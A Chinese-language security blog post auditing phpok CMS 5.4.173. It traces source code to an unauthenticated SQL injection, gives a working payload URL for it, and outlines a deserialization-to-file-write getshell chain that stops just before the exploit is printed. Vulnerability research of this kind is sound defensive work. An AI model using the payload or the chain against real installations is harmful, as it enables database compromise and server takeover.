@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="今日继续cms代码审计，在cnvd上找了找前台的洞，于是选定了phpok cms  phpok cms v5.4.173 前台sql注入在官网上直接下载代码，版本为v5.4.173，安装好之后进入后台提示是否更新，先不更新 phpokcms代码结构如下，可以看到关键代码都在framework文件夹下  phpokcms的路由规则比较简单，index.php admin.php api.php 分别">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpok 5.4.173 代码审计">
+<meta property="og:url" content="http://yoursite.com/2020/02/05/phpok-5-4-173/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="今日继续cms代码审计，在cnvd上找了找前台的洞，于是选定了phpok cms  phpok cms v5.4.173 前台sql注入在官网上直接下载代码，版本为v5.4.173，安装好之后进入后台提示是否更新，先不更新 phpokcms代码结构如下，可以看到关键代码都在framework文件夹下  phpokcms的路由规则比较简单，index.php admin.php api.php 分别">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205131253534.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205131605277.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205183031870.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205171124779.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205175113954.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205211801189.png">
+<meta property="og:updated_time" content="2020-02-15T03:46:12.419Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpok 5.4.173 代码审计">
+<meta name="twitter:description" content="今日继续cms代码审计，在cnvd上找了找前台的洞，于是选定了phpok cms  phpok cms v5.4.173 前台sql注入在官网上直接下载代码，版本为v5.4.173，安装好之后进入后台提示是否更新，先不更新 phpokcms代码结构如下，可以看到关键代码都在framework文件夹下  phpokcms的路由规则比较简单，index.php admin.php api.php 分别">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/05/phpok-5-4-173/image-20200205131253534.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/05/phpok-5-4-173/">
+
+
+
+
+
+  <title>phpok 5.4.173 代码审计 | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/05/phpok-5-4-173/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpok 5.4.173 代码审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-05T21:41:54+08:00">
+                2020-02-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.5k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今日继续cms代码审计，在cnvd上找了找前台的洞，于是选定了phpok cms</p>
+<p><img src="image-20200205131253534.png" alt="image-20200205131253534"></p>
+<h3 id="phpok-cms-v5-4-173-前台sql注入"><a href="#phpok-cms-v5-4-173-前台sql注入" class="headerlink" title="phpok cms v5.4.173 前台sql注入"></a>phpok cms v5.4.173 前台sql注入</h3><p>在官网上直接下载代码，版本为v5.4.173，安装好之后进入后台提示是否更新，先不更新</p>
+<p>phpokcms代码结构如下，可以看到关键代码都在framework文件夹下</p>
+<p><img src="image-20200205131605277.png" alt="image-20200205131605277"></p>
+<p>phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹</p>
+<p>参数c的值再拼接上<code>_control.php</code>就是对应的文件 对应的类即{$c}_control</p>
+<p>参数f的值再拼接上<code>_f</code>就是对应的方法</p>
+<p>漏洞代码在/framework/api/call_control.php中的第27行开始，index_f函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index_f</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$data = <span class="keyword">$this</span>-&gt;get(<span class="string">'data'</span>,<span class="string">'html'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$data)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(P_Lang(<span class="string">'未指定参数变量'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(substr($data,<span class="number">0</span>,<span class="number">1</span>) == <span class="string">'&#123;'</span>)&#123;</span><br><span class="line">			$data = <span class="keyword">$this</span>-&gt;lib(<span class="string">'json'</span>)-&gt;decode(stripslashes($data));</span><br><span class="line">			<span class="keyword">if</span>($data)&#123;</span><br><span class="line">				$data = <span class="keyword">$this</span>-&gt;format($data);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$tmplist = explode(<span class="string">","</span>,$data);</span><br><span class="line">			$data = <span class="keyword">array</span>();</span><br><span class="line">			<span class="keyword">foreach</span>($tmplist <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">				$data[$value] = <span class="keyword">array</span>();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$call_all = <span class="keyword">$this</span>-&gt;model(<span class="string">'call'</span>)-&gt;all(<span class="keyword">$this</span>-&gt;site[<span class="string">'id'</span>],<span class="string">'identifier'</span>);</span><br><span class="line">		$is_ok = <span class="keyword">false</span>;</span><br><span class="line">		$rslist = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			<span class="keyword">if</span>($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][<span class="string">'is_api'</span>])&#123;</span><br><span class="line">				$tmpValue = $value;</span><br><span class="line">				$fid = $key;</span><br><span class="line">				<span class="keyword">if</span>($value[<span class="string">'_alias'</span>])&#123;</span><br><span class="line">					<span class="keyword">unset</span>($tmpValue[<span class="string">'_alias'</span>]);</span><br><span class="line">					$fid = $value[<span class="string">'_alias'</span>];</span><br><span class="line">				&#125;</span><br><span class="line">				$rslist[$fid] = phpok($key,$tmpValue);</span><br><span class="line">				$is_ok = <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            ...</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!$is_ok)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error(P_Lang(<span class="string">'未启用远程调用或没有相关调用参数，请检查'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;success($rslist);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$data 变量直接从get方法中传入，当为json类型时，先用stripslashes处理，然后调用format函数，跟进format函数(/framework/init.php 第1315行)，可以看到主要过滤如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$msg = str_replace(<span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>),<span class="keyword">array</span>(<span class="string">"&amp;#92;"</span>,<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;lt;"</span>,<span class="string">"&amp;gt;"</span>),$msg);</span><br></pre></td></tr></table></figure>
+
+<p>可以见到，对双引号进行了过滤，程序继续运行，将处理后的数据赋值给了$tmpValue，接着判断条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][<span class="string">'is_api'</span>])</span><br></pre></td></tr></table></figure>
+
+<p>动态调试一下，可以知道需要传入的参数</p>
+<p><img src="image-20200205183031870.png" alt="image-20200205183031870"></p>
+<p>然后调用了phpok函数(/framework/phpok_tpl_helper.php)，继续跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpok</span><span class="params">($id=<span class="string">''</span>,$ext=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!$id || !$GLOBALS[<span class="string">'app'</span>]-&gt;call)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$count = func_num_args();</span><br><span class="line">	<span class="keyword">if</span>($count&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> $GLOBALS[<span class="string">'app'</span>]-&gt;call-&gt;phpok($id,$ext);</span><br><span class="line">	&#125;</span><br><span class="line">	$param = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;$count;++$i)&#123;</span><br><span class="line">		$tmp = func_get_arg($i);</span><br><span class="line">		<span class="keyword">if</span>(strpos($tmp,<span class="string">'='</span>) !== <span class="keyword">true</span>)&#123;</span><br><span class="line">			$tmp = str_replace(<span class="string">':'</span>,<span class="string">'='</span>,$tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		$param[] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	$param = implode(<span class="string">"&amp;"</span>,$param);</span><br><span class="line">	<span class="keyword">return</span> $GLOBALS[<span class="string">'app'</span>]-&gt;call-&gt;phpok($id,$param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了phpok(/framework/phpok_call.php)，代码比较长，直接关注重点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">phpok</span><span class="params">($id,$rs=<span class="string">""</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>($rs[<span class="string">'site'</span>])&#123;</span><br><span class="line">        $rs[<span class="string">'site'</span>] = intval($rs[<span class="string">'site'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($rs[<span class="string">'site'</span>] != <span class="keyword">$this</span>-&gt;site[<span class="string">'id'</span>])&#123;</span><br><span class="line">        $siteinfo = <span class="keyword">$this</span>-&gt;model(<span class="string">'site'</span>)-&gt;get_one($rs[<span class="string">'site'</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $siteinfo = <span class="keyword">$this</span>-&gt;site;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>($rs[<span class="string">'site'</span>] != <span class="keyword">$this</span>-&gt;site[<span class="string">'id'</span>])&#123;</span><br><span class="line">        $baseurl = <span class="string">'http://'</span>.$siteinfo[<span class="string">'domain'</span>].$siteinfo[<span class="string">'dir'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $baseurl = <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义 _baseurl</span></span><br><span class="line">    $rs[<span class="string">'_baseurl'</span>] = $baseurl;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;model(<span class="string">'url'</span>)-&gt;base_url($baseurl);</span><br><span class="line">    <span class="keyword">if</span>(substr($id,<span class="number">0</span>,<span class="number">1</span>) != <span class="string">'_'</span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $list = <span class="keyword">$this</span>-&gt;_phpok_sys_func();</span><br><span class="line">        $id = substr($id,<span class="number">1</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span>(!$id || !in_array($id,$list))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $call_rs = array_merge($rs,<span class="keyword">array</span>(<span class="string">'type_id'</span>=&gt;$id));</span><br><span class="line">    &#125;</span><br><span class="line">    $func = <span class="string">'_'</span>.$call_rs[<span class="string">'type_id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!in_array($func,<span class="keyword">$this</span>-&gt;mlist))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$func($call_rs,$cache_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入的$rs参数就是我们可控的$tmpValue，且需要满足第120行的in_array($id,$list)，调试看一看值</p>
+<p><img src="image-20200205171124779.png" alt="image-20200205171124779"></p>
+<p>可以看到，基本上这个类中以_开头的函数都可以通过传入type_id来调用，尝试调用_sql，跟进_sql函数(在第160行)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_sql</span><span class="params">($rs,$cache_id=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $rs[<span class="string">'sqlinfo'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;#39;'</span>,<span class="string">'&amp;quot;'</span>,<span class="string">'&amp;apos;'</span>,<span class="string">'&amp;#34;'</span>),<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"'"</span>,<span class="string">'"'</span>),$rs[<span class="string">'sqlinfo'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($rs[<span class="string">'is_list'</span>] &amp;&amp; $rs[<span class="string">'is_list'</span>] != <span class="string">'false'</span>)&#123;</span><br><span class="line">        $rslist = <span class="keyword">$this</span>-&gt;db-&gt;get_all($rs[<span class="string">'sqlinfo'</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $rslist = <span class="keyword">$this</span>-&gt;db-&gt;get_one($rs[<span class="string">'sqlinfo'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($cache_id &amp;&amp; $rslist)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache-&gt;save($cache_id,$rslist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $rslist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先将引号转回去，再带入数据库查询，继续跟进，可以发现并无过滤，任意sql语句执行</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api.php?c=call&amp;f=index&amp;data=&#123;&quot;m_picplayer&quot;:&#123;&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;select%20user();&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功执行了sql语句</p>
+<p><img src="image-20200205175113954.png" alt="image-20200205175113954"></p>
+<h3 id="phpok-cms-v5-4-173-前台getshell"><a href="#phpok-cms-v5-4-173-前台getshell" class="headerlink" title="phpok cms v5.4.173 前台getshell"></a>phpok cms v5.4.173 前台getshell</h3><p>前边分析了可以任意执行phpok_call.php中以_开头的函数，那么来找一找有没有可以反序列化的地方，在_fields函数中的第1159行调用了unserialize，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_fields</span><span class="params">($rs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    $project_rs = <span class="keyword">$this</span>-&gt;model(<span class="string">'project'</span>)-&gt;project_one($rs[<span class="string">'site'</span>],$rs[<span class="string">'pid'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!$project_rs || !$project_rs[<span class="string">'module'</span>] || !$project_rs[<span class="string">'status'</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    $flist = <span class="keyword">$this</span>-&gt;model(<span class="string">'module'</span>)-&gt;fields_all($project_rs[<span class="string">'module'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($flist)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($flist <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">            <span class="keyword">if</span>($value[<span class="string">'ext'</span>])&#123;</span><br><span class="line">                $value[<span class="string">'ext'</span>] = unserialize($value[<span class="string">'ext'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先调用了project_one(/framework/model/project.php)，会带入数据库查询，返回查询结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">project_one</span><span class="params">($site_id,$id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$id)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$site_id)&#123;</span><br><span class="line">        $site_id = <span class="keyword">$this</span>-&gt;site_id;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM "</span>.<span class="keyword">$this</span>-&gt;db-&gt;prefix.<span class="string">"project WHERE id='"</span>.$id.<span class="string">"' AND site_id='"</span>.$site_id.<span class="string">"'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;get_one($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后进行反序列化操作，而前面已经分析过了，可以执行任意sql语句，所以可以先插入一条序列化的数据，然后通过查找在此处进行反序列化，接下来寻找反序列化的利用链</p>
+<p>在/framework/engine/cache.php中发现了可以利用的点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;key_id,<span class="keyword">$this</span>-&gt;key_list);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;expired();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进save</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($id,$content=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$id || $content === <span class="string">''</span> || !<span class="keyword">$this</span>-&gt;status)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">    $content = serialize($content);</span><br><span class="line">    $file = <span class="keyword">$this</span>-&gt;folder.$id.<span class="string">".php"</span>;</span><br><span class="line">    file_put_contents($file,<span class="string">'&lt;?php exit();?&gt;'</span>.$content);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_time();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_count();</span><br><span class="line">    <span class="keyword">if</span>($GLOBALS[<span class="string">'app'</span>]-&gt;db)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key_list($id,$GLOBALS[<span class="string">'app'</span>]-&gt;db-&gt;cache_index($id));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然写入了exit，但是根据p牛的文章，可以使用php://filter来绕过，exp如下</p>
